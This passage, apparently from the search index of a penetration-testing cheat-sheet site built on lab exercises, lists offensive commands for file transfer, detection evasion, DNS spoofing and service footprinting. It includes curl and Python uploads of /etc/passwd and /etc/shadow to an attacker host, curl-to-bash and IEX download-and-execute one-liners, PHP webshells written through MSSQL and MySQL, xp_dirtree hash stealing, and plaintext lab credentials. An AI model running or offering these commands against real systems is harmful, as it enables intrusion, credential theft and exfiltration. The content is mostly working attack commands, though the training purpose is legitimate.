install pyftpdlib</code></li> <li>Setting up a Python3: <code>sudo python3 -m pyftpdlib --port 21</code></li> <li>Transfering Files from an FTP Server Using PowerShell: <code>(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')</code></li> </ol>"},{"location":"file-transfer/filetransfer/#powershell-web-uploads","title":"*PowerShell Web Uploads","text":"<ol> <li><code>pip3 install uploadserver</code></li> <li><code>python3 -m uploadserver</code></li> <li>`PowerShell Script to Upload a File to Python Upload Server:<ol> <li><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')</code></li> <li><code>Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts</code></li> </ol> </li> <li>PowerShell Base64 Web Upload <ol> <li><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))</code></li> <li><code>Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64</code></li> </ol> </li> </ol>"},{"location":"file-transfer/filetransfer/#smb-uploads","title":"SMB Uploads","text":"<ol> <li>Installing WebDav Python modules: <code>sudo pip3 install wsgidav cheroot</code></li> <li>Using the WebDav Python module: <code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous</code></li> <li>Connecting to the Webdav Share: <code>dir \\\\192.168.49.128\\DavWWWRoot</code></li> <li>Uploading Files using SMB: <ol> <li><code>copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\</code></li> <li><code>copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\</code></li> </ol> </li> </ol>"},{"location":"file-transfer/filetransfer/#ftp-uploads","title":"FTP Uploads","text":"<ol> <li><code>sudo python3 -m pyftpdlib --port 21 --write</code></li> <li>PowerShell Upload File: <code>(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')</code></li> <li>Create a Command File for the FTP Client to Upload a File: <ol> <li><code>echo open 192.168.49.128 &gt; ftpcommand.txt</code></li> <li><code>echo USER anonymous &gt;&gt; ftpcommand.txt</code></li> <li><code>echo binary &gt;&gt; ftpcommand.txt</code></li> <li><code>echo PUT c:\\windows\\system32\\drivers\\etc\\hosts &gt;&gt; ftpcommand.txt</code></li> <li><code>echo bye &gt;&gt; ftpcommand.txt</code></li> <li><code>echo bye &gt;&gt; ftpcommand.txt</code></li> <li><code>open 192.168.49.128</code></li> <li><code>USER anonymous</code></li> <li><code>PUT c:\\windows\\system32\\drivers\\etc\\hosts</code></li> <li><code>bye</code></li> </ol> </li> </ol>"},{"location":"file-transfer/filetransfer/#linux-file-transfer-methods","title":"Linux File Transfer Methods","text":"<ol> <li>Check File MD5 hash: <code>md5sum id_rsa</code></li> <li>Encode SSH Key to Base64: <code>cat id_rsa |base64 -w 0;echo</code></li> <li>Decode the File: <code>echo -n 'LS0tL(...))tLQo=' | base64 -d &gt; id_rsa</code></li> </ol>"},{"location":"file-transfer/filetransfer/#web-downloads-with-wget-and-curl","title":"Web Downloads with Wget and cURL","text":"<ol> <li>Download a File Using wget: <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></li> <li>Download a File Using cURL: <code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></li> </ol>"},{"location":"file-transfer/filetransfer/#fileless-attacks-using-linux","title":"Fileless Attacks Using Linux","text":"<ol> <li>Fileless Download with cURL: <code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</code></li> <li>Fileless Download with wget: <code>wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3</code></li> </ol>"},{"location":"file-transfer/filetransfer/#download-with-bash-devtcp","title":"Download with Bash (/dev/tcp)","text":"<ol> <li>Connect to the Target Webserver: <code>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</code></li> <li>HTTP GET Request: <code>echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3</code></li> <li>Print the Response: <code>cat &lt;&amp;3</code></li> </ol>"},{"location":"file-transfer/filetransfer/#ssh-downloads","title":"SSH Downloads","text":"<ol> <li>Enabling the SSH Server: <code>sudo systemctl enable ssh</code></li> <li>Starting the SSH Server: <code>sudo systemctl start ssh</code></li> <li>Checking for SSH Listening Port: <code>netstat -lnpt</code></li> <li>Linux - Downloading Files Using SCP: <code>scp plaintext@192.168.49.128:/root/myroot.txt .</code></li> </ol>"},{"location":"file-transfer/filetransfer/#linux-upload-operations","title":"Linux Upload Operations","text":"<ol> <li>Start Web Server: <code>sudo python3 -m pip install --user uploadserver</code></li> <li>Pwnbox - Create a Self-Signed Certificate: <code>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'</code></li> <li>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver: <code>mkdir https &amp;&amp; cd https</code></li> <li>Pwnbox - Start Web Server: <code>sudo python3 -m uploadserver 443 --server-certificate ~/server.pem</code></li> <li>Linux - Upload Multiple Files: <code>curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure</code></li> </ol>"},{"location":"file-transfer/filetransfer/#alternative-web-file-transfer-method","title":"Alternative Web File Transfer Method","text":"<ol> <li>Creating a Web Server with Python3: <code>python3 -m http.server 9999</code></li> <li>Creating a Web Server with Python2.7: <code>python2.7 -m SimpleHTTPServer</code></li> <li>Creating a Web Server with PHP: <code>php -S 0.0.0.0:8000</code></li> <li>Creating a Web Server with Ruby: <code>ruby -run -ehttpd . -p8000</code></li> </ol>"},{"location":"file-transfer/filetransfer/#scp-upload","title":"SCP Upload","text":"<ol> <li>File Upload using SCP: <code>scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/</code></li> </ol>"},{"location":"file-transfer/filetransfer/#transferring-files-with-code","title":"Transferring Files with Code","text":"<ol> <li>Python 2 - Download: <code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'</code></li> <li>Python 3 - Download: <code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'</code></li> <li>PHP - Downloads a file using PHP file_get_contents() and saves it with file_put_contents(): <code>php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'</code></li> <li>PHP - Downloads a file using PHP fopen(): <code>php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'</code></li> <li>PHP - Downloads a file using PHP and pipes it to bash: <code>php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash</code> </li> <li>Ruby - Download a File: <code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'</code></li> <li>Perl - Download a File: <code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'</code></li> <li>JS</li> </ol> <pre><code>var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n</code></pre> <ol> <li>JS - Download a File Using cscript.exe: <code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1</code></li> <li>VBScript:</li> </ol> <pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre> <ol> <li>VBScript - Download a File using cscript.exe: <code>cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1</code></li> <li>Upload Operations using Python3:<ol> <li>Starting the Python uploadserver Module: <code>python3 -m uploadserver</code></li> <li>Uploading a File Using a Python One-liner: <code>python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'</code></li> </ol> </li> </ol>"},{"location":"file-transfer/filetransfer/#miscellaneous-file-transfer-methods","title":"Miscellaneous File Transfer Methods","text":""},{"location":"file-transfer/filetransfer/#netcat","title":"NetCat","text":"<ol> <li>Connect from attack host to target:<ol> <li>Compromised Machine - Listening on Port 8000: <code>ncat -l -p 8000 --recv-only &gt; SharpKatz.exe</code> or <code>nc -l -p 8000 &gt; SharpKatz.exe</code></li> <li>Attack Host - Sending File to Compromised machine: <ol> <li><code>wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe</code></li> <li><code>nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</code> or <code>nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</code> Use send-only flag to close connection after file sending.</li> </ol> </li> </ol> </li> <li>Connect from target to Attack Host (NC): <ol> <li>Attack host Sending File as Input to Netcat:<code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</code></li> <li>Compromised Machine Connect to Netcat to Receive the File: <code>nc 192.168.49.128 443 &gt; SharpKatz.exe</code></li> </ol> </li> <li>Connect from target to attack host (NCAT):<ol> <li>Attack Host - Sending File as Input to Ncat - <code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</code></li> <li>Compromised Machine Connect to Ncat to Receive the File: <code>ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe</code></li> </ol> </li> <li>If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.<ol> <li>NetCat - Sending File as Input to Netcat: <code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</code> OR</li> <li>Ncat - Sending File as Input to Ncat: <code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</code></li> <li>Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File: <code>cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</code></li> </ol> </li> </ol>"},{"location":"file-transfer/filetransfer/#powershell-session-file-transfer","title":"PowerShell Session File Transfer","text":"<ol> <li>Basic enumeration with <code>whoami</code>, <code>hostname</code>, <code>Test-NetConnection -ComputerName DATABASE01 -Port 5985</code></li> <li>Create a PowerShell Remoting Session to DATABASE01: <code>$Session = New-PSSession -ComputerName DATABASE01</code></li> <li>Copy samplefile.txt from our Localhost to the DATABASE01 Session: <code>Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\</code></li> <li>Copy DATABASE.txt from DATABASE01 Session to our Localhost: <code>Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session</code></li> </ol>"},{"location":"file-transfer/filetransfer/#rdp","title":"RDP","text":"<ol> <li>Mounting a Linux Folder Using rdesktop: <code>rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'</code></li> <li>Mounting a Linux Folder Using xfreerdp: <code>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer</code></li> </ol>"},{"location":"file-transfer/filetransfer/#protected-file-transfers","title":"Protected File Transfers","text":""},{"location":"file-transfer/filetransfer/#file-encryption-on-windows","title":"File Encryption on Windows","text":"<ol> <li>Download Invoke-AESEncryption.ps1</li> <li>Import module: <code>Import-Module .\\Invoke-AESEncryption.ps1</code></li> <li>File Encryption Example: <code>Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt</code></li> </ol>"},{"location":"file-transfer/filetransfer/#file-encryption-on-linux","title":"File Encryption on Linux","text":"<ol> <li>Encrypting /etc/passwd with openssl: <code>openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</code></li> <li>Decrypt passwd.enc with openssl: <code>openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd</code></li> </ol>"},{"location":"file-transfer/filetransfer/#catching-files-over-https","title":"Catching Files over HTTP/S","text":"<ol> <li>Create a Directory to Handle Uploaded Files: <code>sudo mkdir -p /var/www/uploads/SecretUploadDirectory</code></li> <li>Change the Owner to www-data: <code>sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</code></li> <li>Create Nginx Configuration File:     ```bash         server {         listen 9001;<pre><code>location /SecretUploadDirectory/ {\n    root    /var/www/uploads;\n    dav_methods PUT;\n}\n</code></pre> <p>} <code>`` 4. Symlink our Site to the sites-enabled Directory:</code>sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/<code>5. Start Nginx:</code>sudo systemctl restart nginx.service<code>6. Verifying Errors: 1.</code>tail -2 /var/log/nginx/error.log<code>2.</code>ss -lnpt | grep 80<code>3.</code>ps -ef | grep 2811<code>7. Remove NginxDefault Configuration:</code>sudo rm /etc/nginx/sites-enabled/default<code>8. Upload File Using cURL: 1.</code>curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt<code>2.</code>sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt `</p> </li> </ol>"},{"location":"file-transfer/filetransfer/#living-off-the-land","title":"Living off The Land","text":"<ol> <li>Using the LOLBAS and GTFOBins Project</li> <li>File Download with Bitsadmin: <code>bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe</code></li> <li>Bitstransfer: <code>Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"</code></li> <li>Certutil: <code>certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe</code> or <code>certutil -urlcache -split -f http://10.10.10.32/nc.exe</code></li> </ol>"},{"location":"file-transfer/filetransfer/#evading-detection","title":"Evading Detection","text":"<ol> <li>Listing out User Agents: <code>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label=\"User Agent\";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl</code></li> <li>Request with Chrome User Agent: </li> <li><code>$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome</code></li> <li><code>Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\"</code></li> <li>Transferring File with GfxDownloadWrapper.exe: <code>GfxDownloadWrapper.exe \"http://10.10.10.132/mimikatz.exe\" \"C:\\Temp\\nc.exe\"</code></li> </ol>"},{"location":"footprinting/dns/","title":"DNS","text":"<ol> <li>DIG<ol> <li>NS Query <code>dig ns inlanefreight.htb @10.129.14.128</code></li> <li>Version Query <code>dig CH TXT version.bind 10.129.120.85</code></li> <li>ANY Query <code>dig any inlanefreight.htb @10.129.14.128</code></li> <li>DIG - AXFR Zone Transfer <code>dig axfr inlanefreight.htb @10.129.14.128</code></li> <li>DIG - AXFR Zone Transfer - Internal <code>dig axfr internal.inlanefreight.htb @10.129.14.128</code></li> </ol> </li> <li>Subdomain Brute Forcing <code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done</code></li> <li>DNSenum <code>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb</code></li> <li>Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer: <code>fierce --domain zonetransfer.me</code></li> <li>Subdomain Enumeration: <code>./subfinder -d inlanefreight.com -v</code></li> <li>Subbrute:<ol> <li><code>git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1</code></li> <li><code>cd subbrute</code></li> <li><code>echo \"ns1.inlanefreight.com\" &gt; ./resolvers.txt</code></li> <li><code>./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt</code></li> </ol> </li> <li>Enumerate the CNAME records for those subdomains: <code>host support.inlanefreight.com</code></li> </ol>"},{"location":"footprinting/dns/#local-dns-cache-poisoning","title":"Local DNS Cache Poisoning","text":"<ol> <li>edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to: <code>cat /etc/ettercap/etter.dns</code></li> <li>Start the Ettercap tool and scan for live hosts within the network by navigating to Hosts &gt; Scan for Hosts. </li> <li>Add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.</li> <li>Activate dns_spoof attack by navigating to Plugins &gt; Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110.</li> <li>After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110. In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well:</li> </ol>"},{"location":"footprinting/domain-info/","title":"Domain info","text":"<ol> <li>Certificate Transparency: <code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq .</code></li> <li>Filtered by the unique subdomains: <code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep</code></li> <li>Identify the hosts directly accessible from the Internet and not hosted by third-party providers: <code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li>Shodan: <ol> <li><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done</code></li> <li><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></li> </ol> </li> <li>Display all the available DNS records where we might find more hosts: <code>dig any inlanefreight.com</code></li> </ol>"},{"location":"footprinting/domain-info/#cloud-resources","title":"Cloud Resources","text":"<ol> <li>Company Hosted Servers: <code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li>Google Search for AWS: <code>intext:sometexthere inurl:amazonaws.com</code></li> <li>Google Search for Azure: <code>intext:sometexthere inurl:blob.core.windows.net</code></li> </ol>"},{"location":"footprinting/ftp/","title":"FTP","text":"<ol> <li>Anonymous Login: <code>ftp 10.129.14.136</code> </li> <li>Download file: <code>get filename</code></li> <li>Download All Available Files: <code>wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136</code></li> <li>Upload a File: <code>put testupload.txt</code></li> <li>Nmap:<ol> <li><code>find / -type f -name ftp* 2&gt;/dev/null | grep scripts</code></li> <li><code>sudo nmap -sV -p21 -sC -A 10.129.14.136</code> <code>\u2014scripts \u2014script-trace</code></li> </ol> </li> <li>Brute Forcing with Medusa: <code>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp</code></li> <li>The Nmap -b flag can be used to perform an FTP Bounce Attack: <code>nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</code></li> </ol>"},{"location":"footprinting/imap-pop3/","title":"IMAP/POP3","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC</code></li> <li>cURL: <code>curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd</code> <code>-v</code></li> <li>OpenSSL - TLS Encrypted Interaction POP3: <code>openssl s_client -connect 10.129.14.128:pop3s</code></li> <li>OpenSSL - TLS Encrypted Interaction IMAP: <code>openssl s_client -connect 10.129.14.128:imaps</code></li> <li>IMAP Commands</li> </ol> <pre><code>1 LOGIN username password #User's login.\n1 LIST \"\" * #Lists all directories.  \n1 CREATE \"INBOX\" #Creates a mailbox with a specified name.                                  \n1 DELETE \"INBOX\" #Deletes a mailbox.      \n1 RENAME \"ToRead\" \"Important\" #Renames a mailbox. \n1 LSUB \"\" * #Returns a subset of names from the set of names that the User has declared as being active or subscribed. |\n1 SELECT INBOX #Selects a mailbox so that messages in the mailbox can be accessed.        \n1 UNSELECT INBOX #Exits the selected mailbox.                             \n1 FETCH &lt;ID&gt; all #Retrieves data associated with a message in the mailbox.                  \n1 CLOSE #Removes all messages with the Deleted flag set.                           \n1 LOGOUT #Closes the connection with the IMAP server.                               \n</code></pre> <ol> <li>POP3 Commands</li> </ol> <pre><code>USER #usernameIdentifies the user.                        \nPASS #passwordAuthentication of the user using its password.            \nSTAT #Requests the number of saved emails from the server.      \nLIST #Requests from the server the number and size of all emails.             |\nRETR id #Requests the server to deliver the requested email by ID. \nDELE id #Requests the server to delete the requested email by ID.   \nCAPA #Requests the server to display the server capabilities.   \nRSET #Requests the server to reset the transmitted information. \nQUIT #Closes the connection with the POP3 server. \n</code></pre>"},{"location":"footprinting/ipmi/","title":"IPMI","text":"<ol> <li>Nmap: <code>sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local</code></li> <li>Metasploit Version Scan: <code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version</code></li> <li>Metasploit dump hashes: <code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes</code></li> </ol>"},{"location":"footprinting/ldap/","title":"LDAP","text":"<ol> <li>LDAP Anonymous Bind<ol> <li>Confirmation that anonymous bind can be done with Python:</li> </ol> </li> </ol> <pre><code>from ldap3 import*\ns = Server('10.10.10.161',get_info = ALL)\nc = Connection(s,'','')\nc.bind()\nTrue\n</code></pre> <ol> <li>We can confirm anonymous LDAP bind with <code>ldapsearch</code> and retrieve all AD objects from LDA: <code>ldapsearch -H ldap://10.129.1.207 -x -b \"dc=inlanefreight,dc=local\"</code></li> <li>Windapsearch<ol> <li><code>python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 10.10.10.161 -u \"\" -U</code></li> <li><code>python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 10.10.10.161 -d htb.local --custom \"objectClass=*\"</code></li> </ol> </li> </ol>"},{"location":"footprinting/mongodb/","title":"MongoDB","text":"<ol> <li><code>mongo ip-address:port</code></li> <li><code>show dbs</code></li> <li><code>use db-name</code></li> <li><code>show collections</code></li> <li>Show content of collection: <code>db.flag.find().pretty()</code></li> </ol>"},{"location":"footprinting/mssql/","title":"MSSQL","text":"<ol> <li>Banner grabbing: <code>nmap -Pn -sV -sC -p1433 10.10.10.125</code></li> <li>Nmap: <code>sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248</code></li> <li>MSSQL Ping in Metasploit: <code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248</code></li> <li>Connecting with Mssqlclient.py<ol> <li>connect <code>python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth</code></li> <li>Interact with: <code>select name from sys.databases</code></li> </ol> </li> <li>Sqlcmd:<ol> <li>Connecting to the SQL Server: <code>sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30</code></li> <li><code>SELECT name FROM master.dbo.sysdatabases</code></li> <li><code>Use table-name</code></li> <li><code>SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</code></li> <li><code>SELECT * FROM users</code></li> </ol> </li> <li>If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd: <code>sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h</code></li> </ol>"},{"location":"footprinting/mssql/#xp_cmdshell","title":"XP_CMDSHELL","text":""},{"location":"footprinting/mssql/#mssql-enable-ole-automation-procedures","title":"MSSQL - Enable Ole Automation Procedures","text":"<pre><code>1&gt; sp_configure 'show advanced options', 1\n2&gt; GO\n3&gt; RECONFIGURE\n4&gt; GO\n5&gt; sp_configure 'Ole Automation Procedures', 1\n6&gt; GO\n7&gt; RECONFIGURE\n8&gt; GO\n</code></pre>"},{"location":"footprinting/mssql/#mssql-create-a-file","title":"MSSQL - Create a File","text":"<pre><code>1&gt; DECLARE @OLE INT\n2&gt; DECLARE @FileID INT\n3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\n4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\n5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET[\"c\"]);?&gt;'\n6&gt; EXECUTE sp_OADestroy @FileID\n7&gt; EXECUTE sp_OADestroy @OLE\n8&gt; GO\n</code></pre>"},{"location":"footprinting/mssql/#read-local-files-in-mssql","title":"Read Local Files in MSSQL","text":"<pre><code>1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n2&gt; GO\n</code></pre>"},{"location":"footprinting/mssql/#xp_dirtree-hash-stealing","title":"XP_DIRTREE Hash Stealing","text":"<p><code>EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'</code></p>"},{"location":"footprinting/mssql/#xp_subdirs-hash-stealing","title":"XP_SUBDIRS Hash Stealing","text":"<p><code>EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'</code></p>"},{"location":"footprinting/mssql/#xp_subdirs-hash-stealing-with-responder","title":"XP_SUBDIRS Hash Stealing with Responder","text":"<p><code>sudo responder -I tun0</code></p>"},{"location":"footprinting/mssql/#xp_subdirs-hash-stealing-with-impacket","title":"XP_SUBDIRS Hash Stealing with impacket","text":"<p><code>sudo impacket-smbserver share ./ -smb2support</code></p>"},{"location":"footprinting/mssql/#impersonate-existing-users-with-mssql","title":"Impersonate Existing Users with MSSQL","text":"<pre><code>1&gt; SELECT distinct b.name\n2&gt; FROM sys.server_permissions a\n3&gt; INNER JOIN sys.server_principals b\n4&gt; ON a.grantor_principal_id = b.principal_id\n5&gt; WHERE a.permission_name = 'IMPERSONATE'\n6&gt; GO\n</code></pre>"},{"location":"footprinting/mssql/#verifying-our-current-user-and-role","title":"Verifying our Current User and Role","text":"<pre><code>1&gt; SELECT SYSTEM_USER\n2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')\n3&gt; go\n</code></pre>"},{"location":"footprinting/mssql/#impersonating-the-sa-user","title":"Impersonating the SA User","text":"<pre><code>1&gt; SELECT SYSTEM_USER\n2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')\n3&gt; go\n</code></pre>"},{"location":"footprinting/mssql/#identify-linked-servers-in-mssql","title":"Identify linked Servers in MSSQL","text":"<pre><code>1&gt; SELECT srvname, isremote FROM sysservers\n2&gt; GO\n1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]\n2&gt; GO\n</code></pre>"},{"location":"footprinting/mssql/#_1","title":"MSSQL","text":""},{"location":"footprinting/mysql/","title":"MYSQL","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*</code></li> <li>Interaction with MySQL:<ol> <li>without pass: <code>mysql -u root -h 10.129.14.132</code></li> <li>with pass: <code>mysql -u root -pP4SSw0rd -h 10.129.14.128</code></li> </ol> </li> <li>Commands:</li> </ol> <pre><code>show databases;\nselect version();\nuse mysql;\nshow tables;\nshow columns from &lt;table&gt;;\nselect * from &lt;table&gt;;\nselect * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";\n</code></pre> <ol> <li><code>SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php';</code></li> <li><code>show variables like \"secure_file_priv\";</code></li> <li>MySQL - Read Local Files in MySQL: <code>select LOAD_FILE(\"/etc/passwd\");</code></li> </ol>"},{"location":"footprinting/nfs/","title":"NFS","text":"<ol> <li>Nmap:<ol> <li><code>sudo nmap 10.129.14.128 -p111,2049 -sV -sC</code></li> <li><code>sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049</code></li> </ol> </li> <li>Show Available NFS Shares: <code>showmount -e 10.129.14.128</code></li> <li>Mounting NFS Share:</li> </ol> 